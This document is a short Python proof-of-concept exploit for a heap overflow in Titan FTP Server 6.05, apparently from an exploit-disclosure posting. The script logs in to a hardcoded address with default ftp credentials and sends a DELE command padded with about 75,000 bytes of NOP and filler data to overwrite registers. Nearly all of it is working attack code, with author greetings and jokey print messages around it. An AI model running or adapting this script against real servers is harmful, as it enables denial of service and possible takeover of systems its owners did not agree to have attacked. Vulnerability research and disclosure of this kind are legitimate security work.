#!/usr/bin/python
#
# First of all, thanks to my wife Edita.
#
# Heap overflow in Titan FTP Server version 6.05 build 550
# (DELE ) - probably other commands are vulnerable too
# PoC tested on WinXP sp1
# EAX and ESI are overwritten with 41414141 and 44444444
#
# Greetz to muts, m1k1, bolexxx
# and crew from offsec, remote-exploit.org, Cedes.ba, Itas and Cikom :)
#
# Coded by Muris Kurgas a.k.a j0rgan < muris [at] cg [dot] yu >


import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "\nSaljem zli bafer..."
buffer = '\x90' * 20519 + "A" * 4  + "D" * 4 + "B" * 55000
s.connect(('192.168.1.9',21))
data = s.recv(1024)
s.send('USER ftp' +'\r\n')
data = s.recv(1024)
s.send('PASS ftp' +'\r\n')
data = s.recv(1024)
print "\nBum! Bum! Bum! :)"
s.send('DELE ' +buffer+'\r\n')
s.close()


be safe,
j0rgan

